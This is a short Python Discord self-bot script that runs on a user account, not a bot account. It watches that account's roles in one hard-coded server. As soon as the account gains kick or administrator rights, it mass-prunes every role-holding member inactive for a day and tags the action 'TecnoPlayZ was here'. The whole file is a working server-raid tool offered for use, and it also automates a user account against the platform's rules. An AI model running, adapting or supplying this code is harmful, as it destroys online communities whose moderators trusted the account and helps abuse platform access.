import os
os.system("pip install discord.py==1.7.3 && clear||cls")
import discord
from discord.ext import commands
import sys


token = ""
server_id = 1074204240345579530
wall_role_id = 0
wall_role_hai_ya_nhi = False #true for yes false for no
reason="TecnoPlayZ was here /codez"

client = commands.Bot(command_prefix="idk", help_command=None, self_bot=True,intents=discord.Intents.all())

@client.event
async def on_ready():
    print("Auto Prune On")

@client.event
async def on_member_update(before, after):
  if not after.guild:
    return
  if not after.id == client.user.id:
    return
  if not after.guild.id == server_id:
    return
  if not after.roles != before.roles:
    return
  if not wall_role_hai_ya_nhi:
    if after.guild.me.guild_permissions.administrator or after.guild.me.guild_permissions.kick_members:
      roles = []
      for role in after.guild.roles:
        if len(role.members) != 0:
          roles.append(role)
      alr=await after.guild.prune_members(days=1, roles=roles,reason=reason)
      print("pruned",alr)
      return
  if after.top_role != before.top_role:
    if not wall_role_id == after.top_role.id:
      if wall_role_id == before.top_role.id:
        if after.guild.me.guild_permissions.administrator or after.guild.me.guild_permissions.kick_members:
          roles = []
          for role in after.guild.roles:
            if len(role.members) != 0:
              roles.append(role)
          ok=await after.guild.prune_members(days=1, roles=roles,reason=reason)
          print("pruned",ok)

client.run(token, reconnect=True,bot=False)
